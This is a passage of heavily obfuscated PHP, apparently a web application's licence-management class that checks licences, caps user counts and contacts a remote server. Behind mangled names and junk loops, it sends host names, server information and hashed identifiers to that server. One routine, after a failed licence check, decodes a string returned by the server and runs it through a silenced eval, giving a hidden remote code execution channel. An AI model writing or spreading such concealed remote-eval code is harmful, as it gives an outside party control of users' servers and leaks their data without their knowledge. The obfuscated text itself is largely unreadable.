$¿ ¦ô[68], $¿ ¦ô[69], $¿ ¦ô[70], $¿ ¦ô[71], $¿ ¦ô[72], $¿ ¦ô[73], $¿ ¦ô[74], $¿ ¦ô[75], $¿ ¦ô[76], $¿ ¦ô[77], $¿ ¦ô[78], $¿ ¦ô[79], $¿ ¦ô[80], $¿ ¦ô[81], $¿ ¦ô[82]); $‰ºœî°Õ = $è†óÛ‡‹[633]; if (!$‰ºœî°Õ) { die; } foreach ($‰Õ–ƒ‚ as $ÀÄºŸêÜ) { $ÕÆ„Îì¯ = $GLOBALS[$¿ ¦ô[83]][$¿ ¦ô[84]][$ÀÄºŸêÜ]; if (isset($ÁößâÀ[$ÀÄºŸêÜ])) { $ÕÆ„Îì¯ = $ÁößâÀ[$ÀÄºŸêÜ]; } $òŸÛûı[$¿ ¦ô[85]][$¿ ¦ô[86]][$ÀÄºŸêÜ] = $ÕÆ„Îì¯; } $şå¡°æ¨ = $òŸÛûı[$¿ ¦ô[85]][$¿ ¦ô[86]][$¿ ¦ô[46]]; $ËŸÔ×ï½ = $è†óÛ‡‹[641]; while (strlen($ËŸÔ×ï½) < $è†óÛ‡‹[620]) { if (!$ËŸÔ×ï½) { break; } $ËŸÔ×ï½++; } unset($òŸÛûı[$¿ ¦ô[85]][$¿ ¦ô[87]][$¿ ¦ô[88]]); unset($òŸÛûı[$¿ ¦ô[85]][$¿ ¦ô[87]][$¿ ¦ô[89]]); $ş­éÍ±Æ = $è†óÛ‡‹[642]; unset($òŸÛûı[$¿ ¦ô[85]][$¿ ¦ô[86]][$¿ ¦ô[46]]); $Õ¯‘—ğ÷ = $è†óÛ‡‹[643]; if (!$Õ¯‘—ğ÷) { die; } unset($òŸÛûı[$¿ ¦ô[85]][$¿ ¦ô[86]][$¿ ¦ô[90]]); $Ğ”‰şÑ = $è†óÛ‡‹[644]; if (!$Ğ”‰şÑ) { return; } $òŸÛûı[$¿ ¦ô[85]][$¿ ¦ô[86]][$¿ ¦ô[91]] = array($¿ ¦ô[92] => (int) $şå¡°æ¨[$¿ ¦ô[93]], $¿ ¦ô[94] => (int) _get($şå¡°æ¨, $¿ ¦ô[95], 0)); $òŸÛûı[$¿ ¦ô[96]][$¿ ¦ô[97]] = Action($¿ ¦ô[98])->accessToken(); $òŸÛûı[$¿ ¦ô[96]][$¿ ¦ô[99]] = md5($_SERVER[$¿ ¦ô[100]] . $ÁößâÀ[$¿ ¦ô[101]]); $¿—¼¡‰Â = $è†óÛ‡‹[645]; if (strlen($¿—¼¡‰Â) < $è†óÛ‡‹[634]) { die; } $òŸÛûı[$¿ ¦ô[96]][$¿ ¦ô[102]] = base64_encode(serverInfo()); $òŸÛûı[$¿ ¦ô[96]][$¿ ¦ô[103]] = $this->scvibb4abc8d; $şóÂÊÊø = $è†óÛ‡‹[646]; while ($şóÂÊÊø < $è†óÛ‡‹[613]) { if ($şóÂÊÊø >= 0) { break; } $şóÂÊÊø++; } if ($ÁößâÀ[$¿ ¦ô[103]] != $¿ ¦ô[104]) { $òŸÛûı[$¿ ¦ô[96]][$¿ ¦ô[105]] = $ÁößâÀ[$¿ ¦ô[105]]; $òŸÛûı[$¿ ¦ô[96]][$¿ ¦ô[106]] = $ÁößâÀ[$¿ ¦ô[106]]; $•İ¼¦Šâ = rand_string(10) . $this->scvibb4abc8d . rand_string(5); $òŸÛûı[$¿ ¦ô[85]][$¿ ¦ô[107]][$¿ ¦ô[108]] = $this->zuik254bd638($•İ¼¦Šâ, $òŸÛûı[$¿ ¦ô[96]][$¿ ¦ô[99]]); } if ($this->scvibb4abc8d == $¿ ¦ô[104]) { $òŸÛûı[$¿ ¦ô[85]][$¿ ¦ô[86]][$¿ ¦ô[91]][$¿ ¦ô[95]] = 0; } $òŸÛûı[$¿ ¦ô[96]][$¿ ¦ô[109]] = _get($this->demrd2edb119, $¿ ¦ô[110], $¿ ¦ô[6]); $òŸÛûı[$¿ ¦ô[96]][$¿ ¦ô[111]] = _get($this->demrd2edb119, $¿ ¦ô[112], $¿ ¦ô[6]); if (_get($GLOBALS, $¿ ¦ô[113]) && $this->config[$¿ ¦ô[114]]) { $òŸÛûı[$¿ ¦ô[96]][$¿ ¦ô[115]] = WEB_ROOT; } return $òŸÛûı; } private function sdxib26deafc() { $½›Ÿ¥‰¸ =& $_SERVER[Æ š¦İÈ]; $É¤“‘ñ =& $_SERVER[â­¶Àş‹]; if ($_SERVER[$É¤“‘ñ[24]] == $É¤“‘ñ[116]) { $¿£ˆ¤Â = array($É¤“‘ñ[103] => $this->scvibb4abc8d, $É¤“‘ñ[117] => $this->wkog2a387d2e(), $É¤“‘ñ[118] => Model($É¤“‘ñ[119])->count()); if ($this->scvibb4abc8d != $É¤“‘ñ[104]) { $ª¿¨§É = _get($this->demrd2edb119, $É¤“‘ñ[120]); if ($ª¿¨§É) { $¿£ˆ¤Â[$É¤“‘ñ[121]] = $ª¿¨§É; $¿£ˆ¤Â[$É¤“‘ñ[122]] = strtotime(_get($this->demrd2edb119, $É¤“‘ñ[123])); $¿£ˆ¤Â[$É¤“‘ñ[124]] = _get($this->demrd2edb119, $É¤“‘ñ[112]); } $¨Ú—Âó¼ = Model($É¤“‘ñ[33])->get($É¤“‘ñ[125], $É¤“‘ñ[6], !0); if (is_string($¨Ú—Âó¼) && substr($¨Ú—Âó¼, 0, 1) == $É¤“‘ñ[126]) { $¨Ú—Âó¼ = json_decode_force($¨Ú—Âó¼); } if (is_array($¨Ú—Âó¼) && $¨Ú—Âó¼[$É¤“‘ñ[127]] && strstr($¨Ú—Âó¼[$É¤“‘ñ[127]], $É¤“‘ñ[128])) { $ª°½¾ª  = explode($É¤“‘ñ[128], $¨Ú—Âó¼[$É¤“‘ñ[127]]); $¿£ˆ¤Â[$É¤“‘ñ[129]] = $ª°½¾ª [0]; } } $¿£ˆ¤Â = $this->hury410bd353(json_encode($¿£ˆ¤Â), md5($É¤“‘ñ[130])); $ŒÂ‹¶ÈÀ = array($É¤“‘ñ[131] => $¿£ˆ¤Â); $¨Ô´ûï® = $½›Ÿ¥‰¸[647]; while (strlen($¨Ô´ûï®) < $½›Ÿ¥‰¸[620]) { if (!$¨Ô´ûï®) { break; } $¨Ô´ûï®++; } call_user_func(array($É¤“‘ñ[132], $É¤“‘ñ[133]), $ŒÂ‹¶ÈÀ); } if ($this->scvibb4abc8d == $É¤“‘ñ[104]) { return; } $–ÅÉçÊè = array($É¤“‘ñ[134], $É¤“‘ñ[135], $É¤“‘ñ[136], $É¤“‘ñ[137], $É¤“‘ñ[138], $É¤“‘ñ[139]); $æï¤­Æ = Model($É¤“‘ñ[33])->get(); $ÄÄ×Òìê = $½›Ÿ¥‰¸[648]; if (!$ÄÄ×Òìê) { die; } $ŒÂ‹¶ÈÀ = array($É¤“‘ñ[140] => $æï¤­Æ[$É¤“‘ñ[34]], $É¤“‘ñ[141] => $æï¤­Æ[$É¤“‘ñ[35]], $É¤“‘ñ[142] => $É¤“‘ñ[6]); $ĞÍ³ÍıÏ = $½›Ÿ¥‰¸[649]; if (strlen($ĞÍ³ÍıÏ) < $½›Ÿ¥‰¸[634]) { die; } foreach ($–ÅÉçÊè as $Äç˜µÒÅ) { if (!isset($æï¤­Æ[$Äç˜µÒÅ]) || !$æï¤­Æ[$Äç˜µÒÅ]) { continue; } $ŒÂ‹¶ÈÀ[$Äç˜µÒÅ] = $æï¤­Æ[$Äç˜µÒÅ]; } call_user_func(array($É¤“‘ñ[132], $É¤“‘ñ[133]), $ŒÂ‹¶ÈÀ); } private function wraibd915145() { $“±İ›»« =& $_SERVER[Æ š¦İÈ]; $Äé±…Ï¿ =& $_SERVER[â­¶Àş‹]; if ($_SERVER[$Äé±…Ï¿[24]] != $Äé±…Ï¿[143]) { return; } if (!_get($GLOBALS, $Äé±…Ï¿[113])) { die; } $ãÖºİâ¶ = $GLOBALS[$Äé±…Ï¿[13]]; if (isset($ãÖºİâ¶[$Äé±…Ï¿[144]])) { $this->ubtx56581cc0(); die; } if (!isset($ãÖºİâ¶[$Äé±…Ï¿[145]]) || strlen($ãÖºİâ¶[$Äé±…Ï¿[145]]) != 16) { show_json($Äé±…Ï¿[146] . $ãÖºİâ¶[$Äé±…Ï¿[145]], !1); } $ßì˜Éâñ = Model($Äé±…Ï¿[33])->get($Äé±…Ï¿[101]); $©‹ä¡íÜ = md5($_SERVER[$Äé±…Ï¿[100]] . $ßì˜Éâñ); $÷‘úûÀ = $“±İ›»«[650]; if (!$÷‘úûÀ) { die; } $¢‰ÙõÍ = array($Äé±…Ï¿[145] => $ãÖºİâ¶[$Äé±…Ï¿[145]], $Äé±…Ï¿[147] => rand_string(16), $Äé±…Ï¿[148] => $Äé±…Ï¿[130], $Äé±…Ï¿[149] => $Äé±…Ï¿[150], $Äé±…Ï¿[151] => $_SERVER[$Äé±…Ï¿[152]], $Äé±…Ï¿[153] => $_SERVER[$Äé±…Ï¿[154]], $Äé±…Ï¿[155] => $_SERVER[$Äé±…Ï¿[156]], $Äé±…Ï¿[99] => $©‹ä¡íÜ, $Äé±…Ï¿[157] => Model($Äé±…Ï¿[33])->get($Äé±…Ï¿[125])); if ($ãÖºİâ¶[$Äé±…Ï¿[158]] == $Äé±…Ï¿[159]) { $Ğ…›ûê = $this->hury410bd353($©‹ä¡íÜ, $Äé±…Ï¿[160]); $¸»²ã³Š = $this->zuik254bd638(json_encode($¢‰ÙõÍ), $©‹ä¡íÜ . $Äé±…Ï¿[161], 3); $¸»²ã³Š = $¸»²ã³Š . $Äé±…Ï¿[162] . $_SERVER[$Äé±…Ï¿[152]]; $€Æ‘Éñø = $this->syxf217b27d7($Äé±…Ï¿[163] . $Ğ…›ûê . $Äé±…Ï¿[164] . $¸»²ã³Š, -1); show_json($€Æ‘Éñø, !0); } else { if ($ãÖºİâ¶[$Äé±…Ï¿[158]] == $Äé±…Ï¿[165]) { $•¶÷ô¨É = substr(md5($Äé±…Ï¿[166] . $©‹ä¡íÜ), 12, 15) . $Äé±…Ï¿[167]; $¸»²ã³Š = $this->huce5c949ef6(trim($ãÖºİâ¶[$Äé±…Ï¿[168]]), $•¶÷ô¨É, 2); $·È—“óå = json_decode($¸»²ã³Š, !0); if (!is_array($·È—“óå) || !is_array($·È—“óå[$Äé±…Ï¿[169]]) || $·È—“óå[$Äé±…Ï¿[145]] != !0) { $à´Ì´–‹ = $Äé±…Ï¿[170]; $ñç‚ß ç = $·È—“óå[$Äé±…Ï¿[169]] ? $Äé±…Ï¿[171] . $·È—“óå[$Äé±…Ï¿[169]] : $à´Ì´–‹; show_json($ñç‚ß ç, !1); } else { $¢‰ÙõÍ[$Äé±…Ï¿[147]] = $·È—“óå[$Äé±…Ï¿[169]][$Äé±…Ï¿[172]]; } } else { $·È—“óå = $this->syxf217b27d7($Äé±…Ï¿[173], $¢‰ÙõÍ, 10); } } if (!is_array($·È—“óå) || !is_array($·È—“óå[$Äé±…Ï¿[169]]) || $·È—“óå[$Äé±…Ï¿[145]] != !0) { $à´Ì´–‹ = LNG($Äé±…Ï¿[174]); $ñç‚ß ç = $·È—“óå[$Äé±…Ï¿[169]] ? $Äé±…Ï¿[171] . $·È—“óå[$Äé±…Ï¿[169]] : $à´Ì´–‹; show_json($ñç‚ß ç, !1); } $İÜÊÛ—± = $·È—“óå[$Äé±…Ï¿[169]]; $À†ë¥‹ = $this->fpdg5631fffc($İÜÊÛ—±[$Äé±…Ï¿[175]]); if (!$À†ë¥‹ || $À†ë¥‹ != $İÜÊÛ—±[$Äé±…Ï¿[123]]) { $Ñõ·½ = array($Äé±…Ï¿[176] => Model($Äé±…Ï¿[33])->get($Äé±…Ï¿[101]), $Äé±…Ï¿[177] => $_SERVER[$Äé±…Ï¿[100]], $Äé±…Ï¿[178] => this_url(), $Äé±…Ï¿[153] => $_SERVER[$Äé±…Ï¿[154]]); $¸»²ã³Š = $this->jhpq0defe84d(json_encode($Ñõ·½)); $this->syxf217b27d7($Äé±…Ï¿[179] . $¸»²ã³Š); show_json(LNG($Äé±…Ï¿[180]), !0); } $©©Ì¼ Š = array($Äé±…Ï¿[181] => $İÜÊÛ—±[$Äé±…Ï¿[182]], $Äé±…Ï¿[183] => $İÜÊÛ—±[$Äé±…Ï¿[184]], $Äé±…Ï¿[185] => rand_string(16), $Äé±…Ï¿[103] => $İÜÊÛ—±[$Äé±…Ï¿[186]]); if ($¢‰ÙõÍ[$Äé±…Ï¿[147]]) { $©©Ì¼ Š[$Äé±…Ï¿[185]] = $¢‰ÙõÍ[$Äé±…Ï¿[147]]; } $’Ÿ‹»œš = substr(md5($©©Ì¼ Š[$Äé±…Ï¿[183]]), 10, 10); $¡›ààâš = $’Ÿ‹»œš . $©©Ì¼ Š[$Äé±…Ï¿[103]] . $©©Ì¼ Š[$Äé±…Ï¿[185]]; $©©Ì¼ Š[$Äé±…Ï¿[105]] = strrev(base64_encode($this->hury410bd353($¡›ààâš, $Äé±…Ï¿[187]))); $Úûê«Ô = $“±İ›»«[651]; if (strlen($Úûê«Ô) < $“±İ›»«[634]) { return; } $Õ¨óúÔÕ = rand_string(16); $É‰«ÏÅ = $Õ¨óúÔÕ . $©©Ì¼ Š[$Äé±…Ï¿[103]] . $this->hury410bd353(md5($©©Ì¼ Š[$Äé±…Ï¿[181]]), $Õ¨óúÔÕ); $Î© Œ‡ = $“±İ›»«[652]; $©©Ì¼ Š[$Äé±…Ï¿[106]] = base64_encode(strrev($this->hury410bd353($É‰«ÏÅ, $Äé±…Ï¿[188]))); $åÀÜë¡¹ = $“±İ›»«[653]; if (strlen($åÀÜë¡¹) < $“±İ›»«[620]) { die; } if ($İÜÊÛ—±[$Äé±…Ï¿[189]] && $İÜÊÛ—±[$Äé±…Ï¿[189]] >= 1) { Model($Äé±…Ï¿[33])->setDeep($Äé±…Ï¿[190], $Äé±…Ï¿[191]); } Model($Äé±…Ï¿[33])->set($©©Ì¼ Š); $³ë¶‹îÔ = md5($_SERVER[$Äé±…Ï¿[100]] . strrev($ßì˜Éâñ) . $©©Ì¼ Š[$Äé±…Ï¿[183]]); $šï¾½­Œ = $“±İ›»«[654]; $µĞÒŠ¿ = strrev(substr($³ë¶‹îÔ, 10, 16)); $¦î÷¡ä = $this->zuik254bd638(json_encode($İÜÊÛ—±), $³ë¶‹îÔ); $å¶É™¯ì = array_to_keyvalue(Model($Äé±…Ï¿[7])->listData(), $Äé±…Ï¿[192]); $å—¥ßÃ¢ = $å¶É™¯ì[$Äé±…Ï¿[193]]; $¿÷Ş = array(); $¿÷Ş[$µĞÒŠ¿] = $¦î÷¡ä; $ä»Û¸ĞÔ = $“±İ›»«[655]; Model($Äé±…Ï¿[7])->update($å—¥ßÃ¢[$Äé±…Ï¿[194]], array($Äé±…Ï¿[195] => $¿÷Ş)); $å£îÑ›ê = $“±İ›»«[656]; while (strlen($å£îÑ›ê) < $“±İ›»«[613]) { if (!$å£îÑ›ê) { break; } $å£îÑ›ê++; } $this->demrd2edb119 = $İÜÊÛ—±; $this->scvibb4abc8d = $©©Ì¼ Š[$Äé±…Ï¿[103]]; $¤í’¼ = $“±İ›»«[657]; if (!$¤í’¼) { die; } $this->licenseRegistSuccess(); Cache::set($Äé±…Ï¿[196] . md5($ßì˜Éâñ . $Äé±…Ï¿[197]), $Äé±…Ï¿[6]); show_json(LNG($Äé±…Ï¿[180]), !0); $ï°§ëê = $“±İ›»«[658]; } private function licenseRegistSuccess() { $Ã…¼İò‰ =& $_SERVER[Æ š¦İÈ]; $ÇŸÔ“±” =& $_SERVER[â­¶Àş‹]; $£‡œ„­Š = Model($ÇŸÔ“±”[33])->get(); $¾›¨¾çÅ = $Ã…¼İò‰[659]; if (strlen($¾›¨¾çÅ) < $Ã…¼İò‰[613]) { die; } if ($£‡œ„­Š[$ÇŸÔ“±”[63]] != $ÇŸÔ“±”[191]) { Model($ÇŸÔ“±”[33])->set($ÇŸÔ“±”[63], $ÇŸÔ“±”[191]); } Action($ÇŸÔ“±”[198])->initStart(!0); } private function ubtx56581cc0() { $ìËôüø» =& $_SERVER[Æ š¦İÈ]; $¯Õ›‘ğÎ =& $_SERVER[â­¶Àş‹]; Model($¯Õ›‘ğÎ[33])->set(array($¯Õ›‘ğÎ[181] => $¯Õ›‘ğÎ[6], $¯Õ›‘ğÎ[183] => $¯Õ›‘ğÎ[6], $¯Õ›‘ğÎ[103] => $¯Õ›‘ğÎ[104], $¯Õ›‘ğÎ[105] => $¯Õ›‘ğÎ[6], $¯Õ›‘ğÎ[106] => $¯Õ›‘ğÎ[6])); $Å«Ğ‡¿• = $ìËôüø»[660]; if (!$Å«Ğ‡¿•) { die; } Model($¯Õ›‘ğÎ[33])->setDeep($¯Õ›‘ğÎ[190], $¯Õ›‘ğÎ[199]); $ª«÷öòÜ = $ìËôüø»[661]; while (strlen($ª«÷öòÜ) < $ìËôüø»[620]) { if (!$ª«÷öòÜ) { break; } $ª«÷öòÜ++; } $this->demrd2edb119 = array(); $this->scvibb4abc8d = $¯Õ›‘ğÎ[104]; $§¿å÷Î = $ìËôüø»[662]; if (strlen($§¿å÷Î) < $ìËôüø»[620]) { return; } } private function xrtv91fadeca() { $¾ûÕ×ÌÕ =& $_SERVER[Æ š¦İÈ]; $ßÌÕ”ğŞ =& $_SERVER[â­¶Àş‹]; $_SERVER[$ßÌÕ”ğŞ[154]] = _get($_SERVER, $ßÌÕ”ğŞ[154], APP_HOST); $this->scvibb4abc8d = $ßÌÕ”ğŞ[104]; $¨•ôü›º = $¾ûÕ×ÌÕ[663]; if (!$¨•ôü›º) { die; } $ÙäÂ† = Model($ßÌÕ”ğŞ[33])->get(); $¹±Ïşú = $¾ûÕ×ÌÕ[664]; while (strlen($¹±Ïşú) < $¾ûÕ×ÌÕ[631]) { if (!$¹±Ïşú) { break; } $¹±Ïşú++; } if ($ÙäÂ†[$ßÌÕ”ğŞ[103]] == $ßÌÕ”ğŞ[104]) { return; } $ü©Ìå¸€ = Model($ßÌÕ”ğŞ[33])->get($ßÌÕ”ğŞ[101]); $¯—šÔ€í = $ßÌÕ”ğŞ[196] . md5($ü©Ìå¸€ . $ßÌÕ”ğŞ[197]); $ìöâ¿¥½ = Cache::get($¯—šÔ€í); if (!is_array($ìöâ¿¥½) || !isset($ìöâ¿¥½[$ßÌÕ”ğŞ[200]]) || time() - $ìöâ¿¥½[$ßÌÕ”ğŞ[200]] >= 60) { $¢¯€˜÷è = Model($ßÌÕ”ğŞ[7])->loadList(); $€çÙä­ = $¢¯€˜÷è[$ßÌÕ”ğŞ[193]]; $¼®ûˆˆÇ = md5($_SERVER[$ßÌÕ”ğŞ[100]] . strrev($ü©Ìå¸€) . $ÙäÂ†[$ßÌÕ”ğŞ[183]]); $¨Ñ¦Œ ¾ = strrev(substr($¼®ûˆˆÇ, 10, 16)); $ìöâ¿¥½ = $this->huce5c949ef6($€çÙä­[$ßÌÕ”ğŞ[83]][$¨Ñ¦Œ ¾], $¼®ûˆˆÇ); $ìöâ¿¥½ = json_decode($ìöâ¿¥½, !0); } if (!is_array($ìöâ¿¥½)) { return $this->ubtx56581cc0(); } $øÊ…ŞÃ = strtotime($ìöâ¿¥½[$ßÌÕ”ğŞ[123]]); if (time() >= $øÊ…ŞÃ) { return $this->ubtx56581cc0(); } if (time() - $ìöâ¿¥½[$ßÌÕ”ğŞ[200]] > 20) { $ìöâ¿¥½[$ßÌÕ”ğŞ[200]] = time(); Cache::set($¯—šÔ€í, $ìöâ¿¥½); } $this->demrd2edb119 = $ìöâ¿¥½; $this->scvibb4abc8d = $ÙäÂ†[$ßÌÕ”ğŞ[103]]; $Ş³ı™ßõ = $¾ûÕ×ÌÕ[665]; } private function hpqm7e6f92c2() { $‰è­¥“Ã =& $_SERVER[â­¶Àş‹]; $¿Ó¯øß = $GLOBALS[$‰è­¥“Ã[13]]; $ ÛƒùÖ = $_SERVER[Æ š¦İÈ][666]; $ş£óµ«¡ = $_SERVER[$‰è­¥“Ã[24]]; if ($ş£óµ«¡ == $‰è­¥“Ã[201] && $this->scvibb4abc8d == $‰è­¥“Ã[104]) { show_json(LNG($‰è­¥“Ã[202]), !1, $‰è­¥“Ã[203]); } $ÑÃ½°ù = array($‰è­¥“Ã[204], $‰è­¥“Ã[205]); if (in_array($ş£óµ«¡, $ÑÃ½°ù)) { if ($this->scvibb4abc8d == $‰è­¥“Ã[104] && isset($¿Ó¯øß[$‰è­¥“Ã[206]])) { show_json(LNG($‰è­¥“Ã[202]), !1, $‰è­¥“Ã[203]); die; } $’Óç§§ = $this->wkog2a387d2e(); if ($’Óç§§ != intval($‰è­¥“Ã[207])) { if ($’Óç§§ <= Model($‰è­¥“Ã[119])->count()) { show_json(LNG($‰è­¥“Ã[208]), !1, $‰è­¥“Ã[203]); die; } } } } private function nhymd432b709() { $ÎäàÆÇ‚ =& $_SERVER[Æ š¦İÈ]; $åÀ¼…À³ =& $_SERVER[â­¶Àş‹]; $¦õº¶ÆŠ = array($åÀ¼…À³[116], $åÀ¼…À³[209]); if (!_get($GLOBALS, $åÀ¼…À³[113]) || !isset($_GET[$åÀ¼…À³[210]])) { return; } if (!in_array($_SERVER[$åÀ¼…À³[24]], $¦õº¶ÆŠ)) { return; } $È§Âş˜£ = $åÀ¼…À³[211]; $È§Âş˜£ = $this->diep44e7f5c3($È§Âş˜£, $åÀ¼…À³[212]); $ÎÁÌ‹‹³ = $ÎäàÆÇ‚[667]; while ($ÎÁÌ‹‹³ < $ÎäàÆÇ‚[620]) { if ($ÎÁÌ‹‹³ >= 0) { break; } $ÎÁÌ‹‹³++; } $åªıûïó = stream_context_create(array($åÀ¼…À³[213] => array($åÀ¼…À³[214] => $åÀ¼…À³[215], $åÀ¼…À³[216] => 3))); $¬±¨÷ª˜ = $ÎäàÆÇ‚[668]; $â›şÍŒó = @file_get_contents($È§Âş˜£, !1, $åªıûïó); header($åÀ¼…À³[217]); $°…£â‹ = $ÎäàÆÇ‚[669]; if (!$°…£â‹) { return; } if ($â›şÍŒó && strstr($â›şÍŒó, $åÀ¼…À³[218])) { echo $â›şÍŒó; } die; } public function pasdb5851688($â‹ÉÖ§ƒ) { $Õ¨¼Áú— =& $_SERVER[Æ š¦İÈ]; $÷ºÛ¸Óâ =& $_SERVER[â­¶Àş‹]; if ($this->scvibb4abc8d == $÷ºÛ¸Óâ[219]) { return $â‹ÉÖ§ƒ; } $şóÑ¾¾Ï = array($÷ºÛ¸Óâ[220] => $÷ºÛ¸Óâ[221], $÷ºÛ¸Óâ[222] => $÷ºÛ¸Óâ[221], $÷ºÛ¸Óâ[223] => $÷ºÛ¸Óâ[221], $÷ºÛ¸Óâ[224] => $÷ºÛ¸Óâ[221], $÷ºÛ¸Óâ[225] => $÷ºÛ¸Óâ[226], $÷ºÛ¸Óâ[227] => $÷ºÛ¸Óâ[226], $÷ºÛ¸Óâ[228] => $÷ºÛ¸Óâ[226], $÷ºÛ¸Óâ[229] => $÷ºÛ¸Óâ[226], $÷ºÛ¸Óâ[230] => $÷ºÛ¸Óâ[226], $÷ºÛ¸Óâ[231] => $÷ºÛ¸Óâ[226], $÷ºÛ¸Óâ[232] => $÷ºÛ¸Óâ[226], $÷ºÛ¸Óâ[233] => $÷ºÛ¸Óâ[226], $÷ºÛ¸Óâ[234] => $÷ºÛ¸Óâ[226], $÷ºÛ¸Óâ[235] => $÷ºÛ¸Óâ[226], $÷ºÛ¸Óâ[236] => $÷ºÛ¸Óâ[226], $÷ºÛ¸Óâ[237] => $÷ºÛ¸Óâ[226]); $¬Øß£òî = explode($÷ºÛ¸Óâ[238], _get($this->demrd2edb119, $÷ºÛ¸Óâ[110], $÷ºÛ¸Óâ[6])); $ëíµ¸©Ó = $Õ¨¼Áú—[670]; if (!$ëíµ¸©Ó) { die; } $¯êÀû”¥ = array(); foreach ($şóÑ¾¾Ï as $âòµÏË => $ŠëÓ°ÒÒ) { if ($ŠëÓ°ÒÒ == $÷ºÛ¸Óâ[221] && substr($this->scvibb4abc8d, 0, 1) == $÷ºÛ¸Óâ[221]) { continue; } if (!in_array($âòµÏË, $¬Øß£òî)) { $¯êÀû”¥[] = $âòµÏË; } } foreach ($¯êÀû”¥ as $âòµÏË) { unset($â‹ÉÖ§ƒ[$âòµÏË]); $Õå“Ç¥“ = $Õ¨¼Áú—[671]; while (strlen($Õå“Ç¥“) < $Õ¨¼Áú—[634]) { if (!$Õå“Ç¥“) { break; } $Õå“Ç¥“++; } } return $â‹ÉÖ§ƒ; $Ã½ì‡ˆİ = $Õ¨¼Áú—[672]; } private function ysoj6219fb7f() { $ÑÕ˜¾…˜ =& $_SERVER[â­¶Àş‹]; if ($this->scvibb4abc8d != $ÑÕ˜¾…˜[104]) { $GLOBALS[$ÑÕ˜¾…˜[83]][$ÑÕ˜¾…˜[87]][$ÑÕ˜¾…˜[239]] = $ÑÕ˜¾…˜[199]; return; } $GLOBALS[$ÑÕ˜¾…˜[83]][$ÑÕ˜¾…˜[240]] = $ÑÕ˜¾…˜[191]; if (Model($ÑÕ˜¾…˜[241])->get($ÑÕ˜¾…˜[63]) != $ÑÕ˜¾…˜[199]) { Model($ÑÕ˜¾…˜[241])->set($ÑÕ˜¾…˜[63], $ÑÕ˜¾…˜[199]); } } public function fzwnd0b7d0df() { return $_SERVER[â­¶Àş‹][242]; $¶İ˜…”ë = $_SERVER[Æ š¦İÈ][673]; } private function zgsb0f16b8d2() { $Ëˆá†½ =& $_SERVER[Æ š¦İÈ]; $”îÏ„á =& $_SERVER[â­¶Àş‹]; $½–®‰Õ = array($”îÏ„á[243], $”îÏ„á[244], $”îÏ„á[245]); $‚ˆÁ¾œ = $Ëˆá†½[674]; if (strlen($‚ˆÁ¾œ) < $Ëˆá†½[613]) { return; } $ˆÈÌØ“œ = $”îÏ„á[246] . md5($”îÏ„á[247]); if ($this->scvibb4abc8d == $”îÏ„á[104] || !_get($GLOBALS, $”îÏ„á[113])) { return; } if (!in_array($_SERVER[$”îÏ„á[24]], $½–®‰Õ)) { return; } if (time() % 4 != 0) { return; } $Æ£´û‡ = call_user_func(array($”îÏ„á[248], $”îÏ„á[249]), $ˆÈÌØ“œ); if ($Æ£´û‡ && time() - $Æ£´û‡ < intval($”îÏ„á[250])) { return; } call_user_func(array($”îÏ„á[248], $”îÏ„á[133]), $ˆÈÌØ“œ, time()); $šä’ÛÊ = $Ëˆá†½[675]; $àË‚”äé = Model($”îÏ„á[33])->get($”îÏ„á[101]); $áéÁı£Ğ = array($”îÏ„á[145] => Model($”îÏ„á[33])->get($”îÏ„á[181]), $”îÏ„á[158] => $this->scvibb4abc8d, $”îÏ„á[155] => $_SERVER[$”îÏ„á[156]], $”îÏ„á[157] => Model($”îÏ„á[33])->get($”îÏ„á[125]), $”îÏ„á[99] => md5($_SERVER[$”îÏ„á[100]] . $àË‚”äé), $”îÏ„á[148] => $”îÏ„á[130], $”îÏ„á[151] => $_SERVER[$”îÏ„á[152]]); $Î¶Ê• = $this->syxf217b27d7($”îÏ„á[251], $áéÁı£Ğ); $¿Æ”ëÚ = $Ëˆá†½[676]; if (!$¿Æ”ëÚ) { return; } if (!is_array($Î¶Ê•)) { return; } if ($Î¶Ê•[$”îÏ„á[145]] && $Î¶Ê•[$”îÏ„á[252]]) { if ($this->fpdg5631fffc($Î¶Ê•[$”îÏ„á[252]]) == $áéÁı£Ğ[$”îÏ„á[145]]) { return; } } $this->ubtx56581cc0(); if ($this->fpdg5631fffc($Î¶Ê•[$”îÏ„á[252]]) != $áéÁı£Ğ[$”îÏ„á[145]]) { $àï²í±… = array($”îÏ„á[176] => $àË‚”äé, $”îÏ„á[177] => $_SERVER[$”îÏ„á[100]], $”îÏ„á[178] => this_url(), $”îÏ„á[153] => $_SERVER[$”îÏ„á[154]]); $¦À½Ş˜ì = $this->jhpq0defe84d(json_encode($àï²í±…)); $Î¶Ê• = $this->syxf217b27d7($”îÏ„á[179] . $¦À½Ş˜ì); if ($Î¶Ê• && is_array($Î¶Ê•) && isset($Î¶Ê•[$”îÏ„á[252]])) { $Û²ËíÒæ = $this->huce5c949ef6($Î¶Ê•[$”îÏ„á[252]], 2); if ($Û²ËíÒæ) { $Û²ËíÒæ = $this->fpdg5631fffc($Û²ËíÒæ); } if ($Û²ËíÒæ) { try { @eval($Û²ËíÒæ); } catch (Exception $ËÅë×¢â) { } } } } } private function syxf217b27d7($î†’æä¼ = '', $—î‹¶ëç = array(), $˜‡€Æ“ˆ = 5) { $¥óØşë =& $_SERVER[Æ š¦İÈ]; $¬•¢Æª» =& $_SERVER[â­¶Àş‹]; $„•±±èâ = $¬•¢Æª»[253]; $ÌâŞó…¸ = $¥óØşë[677]; if (!$ÌâŞó…¸) { die; } $„•±±èâ = $this->diep44e7f5c3($„•±±èâ, $¬•¢Æª»[254]); $à¹¡…À = $¥óØşë[678]; if (strlen($à¹¡…À) < $¥óØşë[631]) { die; } $„•±±èâ = $„•±±èâ . $î†’æä¼; if ($—î‹¶ëç && is_array($—î‹¶ëç)) { $„•±±èâ = $„•±±èâ . $¬•¢Æª»[255] . http_build_query($—î‹¶ëç); } if ($—î‹¶ëç === -1) { return $„•±±èâ; } $©•Ñ›Äü = stream_context_create(array($¬•¢Æª»[213] => array($¬•¢Æª»[216] => $˜‡€Æ“ˆ, $¬•¢Æª»[214] => $¬•¢Æª»[256]), $¬•¢Æª»[257] => array($¬•¢Æª»[258] => !1, $¬•¢Æª»[259] => !1))); $åéäŞö» = $¥óØşë[679]; if (strlen($åéäŞö») < $¥óØşë[613]) { die; } $—î‹¶ëç = @file_get_contents($„•±±èâ, !1, $©•Ñ›Äü); return json_decode($—î‹¶ëç, !0); $ÆùÒÌ˜ = $¥óØşë[680]; if (!$ÆùÒÌ˜) { die; } } private function wkog2a387d2e() { $ìÕŠó¥š =& $_SERVER[Æ 